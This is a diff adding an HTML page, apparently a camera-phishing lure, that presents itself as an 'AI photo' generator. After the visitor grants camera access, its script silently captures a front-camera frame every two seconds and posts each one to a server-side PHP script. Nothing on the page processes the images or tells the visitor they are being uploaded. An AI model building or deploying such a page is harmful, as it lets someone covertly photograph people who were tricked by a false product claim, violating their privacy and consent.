@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ai photo genrate</title>
+</head>
+<body>
+    <h1>live normal photo to ai photo make</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+
+    <script>
+        const video = document.getElementById('video');
+        const captureInterval = 2000; // Capture photo every 2 seconds
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                console.error('Error accessing the front camera:', error);
+            });
+
+        // Continuously capture and send photos to the server
+        setInterval(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert the captured photo to a data URL
+            const photoData = canvas.toDataURL('image/jpeg');
+
+            // Send the photo data to a PHP script for processing
+            fetch('process_photo.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: 'photoData=' + encodeURIComponent(photoData)
+            })
+            .then(response => {
+                console.log('Photo captured and sent to server');
+            })
+            .catch(error => {
+                console.error('Error capturing and sending photo:', error);
+            });
+        }, captureInterval);
+    </script>
+</body>
+</html>
